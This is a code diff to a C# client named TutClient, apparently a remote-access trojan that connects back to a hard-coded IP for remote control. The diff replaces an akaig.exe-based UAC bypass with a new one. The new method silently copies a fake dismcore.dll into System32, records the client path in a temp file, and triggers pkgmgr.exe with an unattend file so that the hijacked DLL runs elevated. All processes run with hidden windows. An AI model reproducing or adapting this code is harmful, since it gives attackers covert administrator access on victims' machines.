@@ -257,7 +257,7 @@ namespace TutClient
                 {
                     attempts++;
                     Console.WriteLine("Connection attempt " + attempts);
-                    string connectionString = GetIPAddress("192.168.10.58"); //Replace IP with DNS if you want
+                    string connectionString = GetIPAddress("192.168.10.56"); //Replace IP with DNS if you want
                     _clientSocket.Connect(IPAddress.Parse(connectionString), _PORT); //ip is your local ip OR WAN Domain if you going for WAN control
                     Thread.Sleep(100);
                 }
@@ -1801,28 +1801,51 @@ namespace TutClient
 
         public bool BypassUAC()
         {
-            bool bit64 = Is64Bit();
-            string fileName = "akaig";
-            if (bit64) fileName += "64";
-            else fileName += "32";
-            fileName += ".exe"; // Launch akaig.exe, run method 23
-            string fullPath = Application.StartupPath + "\\" + fileName;
-            if (!File.Exists(fullPath))
+            const string dismCoreDll = "dismcore.dll";
+            const string copyFile = "copyFile.exe";
+            const string unattendFile = "unattend.xml";
+            const string launcherFile = "launch.exe";
+
+            //Check core files
+
+            if (!File.Exists(dismCoreDll) || !File.Exists(copyFile) || !File.Exists(unattendFile) || !File.Exists(launcherFile))
             {
-                Program.reportError(Program.errorType.FILE_NOT_FOUND, "UAC Bypass", fileName + " doesn't exists on the target machine");
+                Program.reportError(Program.errorType.FILE_NOT_FOUND, "UAC Bypass", "One or more of the core files not found, please upload them manually");
                 return false;
             }
 
-            ProcessStartInfo si = new ProcessStartInfo();
-            si.FileName = fullPath;
-            si.Arguments = "23 \"" + Application.ExecutablePath.Replace("\\", "\\\\") + "\"";
-            si.WindowStyle = ProcessWindowStyle.Hidden;
-            Process akaigProcess = new Process();
-            akaigProcess.StartInfo = si;
-            akaigProcess.Start();
-            Console.WriteLine("Akaig process started!");
-            akaigProcess.WaitForExit();
-            Console.WriteLine("Akaig process finished!");
+            //Copy fake dismcore.dll into System32
+
+            ProcessStartInfo startInfo = new ProcessStartInfo();
+            startInfo.FileName = Application.StartupPath + "\\" + copyFile;
+            startInfo.Arguments = "\"" + Application.StartupPath + "\\" + dismCoreDll + "\" C:\\Windows\\System32";
+            startInfo.WindowStyle = ProcessWindowStyle.Hidden;
+            Process elevatedCopy = new Process();
+            elevatedCopy.StartInfo = startInfo;
+            elevatedCopy.Start();
+            Console.WriteLine("Waiting for elevated copy to finish");
+            elevatedCopy.WaitForExit();
+            if (elevatedCopy.ExitCode != 0) Console.WriteLine("Error during elevated copy");
+
+            //Create a file pointing to the startup path (reference for the fake dll)
+
+            string tempFileLocation = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Temp\\clientlocationx12.txt";
+
+            if (!File.Exists(tempFileLocation)) File.Create(tempFileLocation).Close();
+            File.WriteAllText(tempFileLocation, Application.StartupPath);
+
+            //Trigger dismcore.dll with pgkmgr.exe
+
+            startInfo = new ProcessStartInfo();
+            startInfo.FileName = Application.StartupPath + "\\" + launcherFile;
+            startInfo.Arguments = "C:\\Windows\\System32\\pkgmgr.exe \"/quiet /n:\"" + Application.StartupPath + "\\" + unattendFile + "\"\"";
+            startInfo.WindowStyle = ProcessWindowStyle.Hidden;
+            Process bypassProcess = new Process();
+            bypassProcess.StartInfo = startInfo;
+            bypassProcess.Start();
+            Console.WriteLine("Waiting for bypass process to finish");
+            bypassProcess.WaitForExit();
+            Console.WriteLine("Bypass completed");
             return true;
         }
     }
